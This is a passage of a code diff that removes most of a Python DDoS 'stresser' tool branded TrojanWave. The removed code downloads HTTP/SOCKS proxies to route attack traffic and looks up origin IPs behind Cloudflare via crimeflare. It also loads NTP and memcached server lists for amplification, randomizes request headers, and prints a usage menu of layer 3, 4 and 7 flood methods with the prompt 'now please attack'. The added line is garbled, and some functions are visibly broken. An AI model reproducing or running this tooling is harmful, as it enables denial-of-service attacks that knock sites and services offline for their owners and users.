-        start_attack(method, threads, event, socks_type)
-        event.clear()
-        event.set()
-    while True:
-        try:
-            sleep(0.1)
-        except KeyboardInterrupt:
-            break
-
-
-def proxydl(out_file, socks_type):
-    global proxies, multiple, choice, data
-    ms = 1
-    if socks_type == 1:
-        socktyper = "HTTP"
-    if socks_type == 4:
-        socktyper = "SOCKS4"
-    if socks_type == 5:
-        socktyper = "SOCKS5"
-
-    print("downloading {}'s proxy plz wait".format(socktyper))
-    downloadsocks(choice, "socks_urls.json")
-    proxies = open(str(out_file)).readlines()
-    check_list(out_file)
-    check_socks(ms)
-
-
-bds = 0
-
-
-# layer tool :||||||||||||
-def toolgui():
-    global bds
-    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
-    if bds == 0:
-        print('''
-Tools:
- ''' + tos + '''
-Other:
- Clear
- Exit
-        ''')
-    bds = 1
-    tool = input(socket.gethostname() + "@" + name + ":~# ").lower()
-    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
-            tool != "close"):
-        pass
-    else:
-        exit()
-    if tool == "cfip":
-        domain = input(socket.gethostname() + '@' + name + '}:~/give-me-ipaddress# ')
-        cfip(domain)
-        return tools()
-    elif tool == "dstat":
-        print(tool + ": command ready")
-        return tools()
-    elif tool == "dns":
-        return tools()
-    elif tool == "check":
-        domain = input(socket.gethostname() + '@' + name + '}:~/give-me-ipaddress# ')
-        check(domain)
-        return tools()
-    elif tool == "ping":
-        domain = input(socket.gethostname() + '@' + name + '}:~/give-me-ipaddress# ')
-        piger(domain)
-        return tools()
-    elif tool == "info":
-        domain = input(socket.gethostname() + '@' + name + '}:~/give-me-ipaddress# ')
-        piger(domain)
-        return tools()
-    elif (tool == "help") or (tool == "h") or (tool == "?"):
-        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
-        print('''
-Tools:
- {tos}
-Other:
- Clear
- Exit
-        ''')
-        return tools()
-    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
-        print("\033[H\033[J")
-        return tools()
-    elif not tool:
-        return tools()
-
-    elif " " in tool:
-        return tools()
-    elif "        " in tool:
-        return tools()
-    elif "  " in tool:
-        return tools()
-    elif "\n" in tool:
-        return tools()
-    elif "\r" in tool:
-        return tools()
-
-    else:
-        print(tool + ": command not found")
-        return tools()
-
-
-def tools():
-    global domain, name
-    name = "TrojanWave"
-    try:
-        tool = sys.argv[2].lower()
-        if tool != "dstat":
-            domain = sys.argv[3]
-            if str('.') not in str(domain):
-                print('address not found')
-                toolgui()
-        if tool == "cfip":
-            cfip(domain)
-        elif tool == "dns":
-            print(tool + ": comming soon !")
-        elif tool == "check":
-            check(domain)
-        elif tool == "ping":
-            piger(domain)
-        elif tool == "dstat":
-            address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
-            print('now please attack to {address}')
-            os.system('dstat')
-        else:
-            print('tool not found')
-            toolgui()
-    except IndexError:
-        toolgui()
-
-
-def cfip(domain):
-    if str("http") in str(domain):
-        domain = domain.replace('https://', '').replace('http:', '').replace('/')
-    URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
-    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
-    print(r.text)
-
-
-def check(domain):
-    if str("http") not in str(domain):
-        domain = "http://" + domain
-    print('please wait ...')
-    r = requests.get(domain, timeout=20)
-    if str("50") in str(r.status_code):
-        die = "OFFLINE"
-    else:
-        die = "ONLINE"
-    print('\nstatus_code: ' + r.status_code)
-    print('status: ' + die + '\n')
-
-
-def piger(siye):
-    if str("https") in str(siye):
-        domain = str(siye).replace('https', '').replace('/', '').replace(':', '')
-    elif str("http") in str(siye):
-        domain = str(siye).replace('http', '').replace('/', '').replace(':', '')
-    else:
-        domain = str(siye)
-    print('please wait ...')
-    r = pig(domain, count=5, interval=0.2)
-    if r.is_alive:
-        die = "ONLINE"
-    else:
-        die = "OFFLINE"
-    print('\nAddress: ' + r.address)
-    print('Ping: ' + r.avg_rtt)
-    print('Aceepted Packets: ' + r.packets_received + '/' + r.packets_sent)
-    print('status: ' + die + '\n')
-
-
-def usgeaseets():
-    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s, l4s, tos, ots, l3s
-    socks = ["1", "4", "5"]
-    sockst = ["socks4.txt", "socks5.txt", "http.txt"]
-    try:
-        if sys.argv[3] not in socks:
-            SOCKST = Choice(socks)
-        elif sys.argv[3]:
-            SOCKST = sys.argv[3]
-
-        else:
-            SOCKST = Choice(socks)
-    except:
-        SOCKST = Choice(socks)
-
-    if (str(SOCKST) == str('1')):
-        proxylist = "http.txt"
-    else:
-        proxylist = "socks{0}.txt".format(SOCKST)
-
-    try:
-        met = str(sys.argv[1]).upper()
-        if met not in list(methods):
-            metho = Choice(methods).lower()
-        elif sys.argv[1]:
-            metho = sys.argv[1]
-        else:
-            metho = Choice(methods).lower()
-    except:
-        metho = Choice(methods).lower()
-    try:
-        methos = metho.upper()
-        if (methos in l4) or (methos in l3):
-            url = sys.argv[2]
-        elif str("http") not in sys.argv[2]:
-            url = "https://example.ir"
-        elif sys.argv[2]:
-            url = sys.argv[2]
-        else:
-            url = "https://example.ir"
-    except:
-        url = "https://example.ir"
-    try:
-        if sys.argv[4]:
-            thr = sys.argv[4]
-        else:
-            thr = Intn(100, 1000)
-    except:
-        thr = Intn(10, 1000)
-    try:
-        if (sys.argv[5] not in sockst):
-            exit()
-    except IndexError:
-        pass
-    except:
-        print('socks type not found')
-        exit()
-
-    try:
-        if sys.argv[6]:
-            muli = sys.argv[6]
-        else:
-            muli = Intn(5, 100)
-    except:
-        muli = Intn(5, 100)
-    try:
-        if sys.argv[7]:
-            tim = sys.argv[7]
-        else:
-            tim = Intn(10, 10000)
-    except:
-        tim = Intn(10, 10000)
-
-    l4s = str(l4).replace("'", "").replace("[", "").replace("]", "")
-    l3s = str(l3).replace("'", "").replace("[", "").replace("]", "")
-    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")
-    tos = str(to).replace("'", "").replace("[", "").replace("]", "")
-    ots = str(ot).replace("'", "").replace("[", "").replace("]", "")
-
-
-def usge():
-    usgeaseets()
-    print('* Coded By MH_ProDev For Better Stresser')
-    print('python3 {} <method> <url> <socks_type5.4.1> <threads> <proxylist> <multiple> <timer>\n'.format(sys.argv[0]))
-    print(' > Methods:')
-    print(' - L3')
-    print(' | {} | {} Methods'.format(l3s, len(l3)))
-    print(' - L4')
-    print(' | {} | {} Methods'.format(l4s, len(l4)))
-    print(' - L7')
-    print(' | {} | {} Methods'.format(l7s, len(l7)))
-    print(' - TOOLS')
-    print(' | {} | {} Methods'.format(tos, len(to)))
-    print(' - Other')
-    print(' | {} | {} Methods'.format(ots, len(ot)))
-    print(' - All {} Method \n'.format(len(methodsl)))
-    print(
-        'expmple:\n python3 {} {} {} {} {} {} {} {}'.format(sys.argv[0], metho, url, SOCKST, thr, proxylist, muli, tim))
-
-
-def makefile(text):
-    if text == "files/":
-        os.mkdir(text)
-    elif text == "files/proxys/":
-        os.mkdir(text)
-    else:
-        open(text, 'w').close()
-    print('File: ', text)
-
-
-if __name__ == '__main__':
-    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
-    from time import sleep
-    from icmplib import ping as pig
-    from scapy.layers.inet import TCP
-    from scapy.all import *
-    from socket import gaierror
-
-    acceptall = [
-        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
-        "Accept-Encoding: gzip, deflate",
-        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
-        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
-        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
-        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
-        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
-        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
-        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
-        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
-        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
-        "Accept: text/html, application/xhtml+xml",
-        "Accept-Language: en-US,en;q=0.5",
-        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
-        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
-    ]
-
-    data = ""
-    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
-    Intn = random.randint
-    Choice = random.choice
-    if not os.path.exists('files/'):
-        makefile('files/')
-    if not os.path.exists('files/proxys/'):
-        makefile('files/proxys/')
-    if not os.path.exists('files/useragent.txt'):
-        makefile('files/proxys/useragent.txt')
-    if not os.path.exists('files/ntp_servers.txt'):
-        makefile('files/ntp_servers.txt')
-    if not os.path.exists('files/memcached_servers.txt'):
-        makefile('files/memcached_servers.txt')
-    if not os.path.exists('files/referers.txt'):
-        makefile('files/referers.txt')
-    try:
-        with open("files/useragent.txt", "r") as f:
-            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
-        with open("files/referers.txt", "r") as f:
-            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
-        with open("files/memcached_servers.txt", "r") as f:
-            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
-        with open("files/ntp_servers.txt", "r") as f:
-            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
-        UserAgent = Choice(readuser)
-        referers = Choice(readref)
-        memcached_servers = Choice(memsv)
-        try:
-            bdr = str(sys.argv[1]).lower()
-            if bdr == "tools":
-                tools()
-            elif bdr == "stop":
-                stop()
-            elif bdr == "help":
-                usge()
-            elif len(sys.argv) <= int(7):
-                usge()
-            else:
-                main()
-        except IndexError:
-            usge()
-    except KeyboardInterrupt:
-        sys.exit()
-    except IndexError:
-        usge()
-
+    get_host = "GET " + path + " HTTP/1.txt.1.txt\r\nHost: " + target + "\r\n"
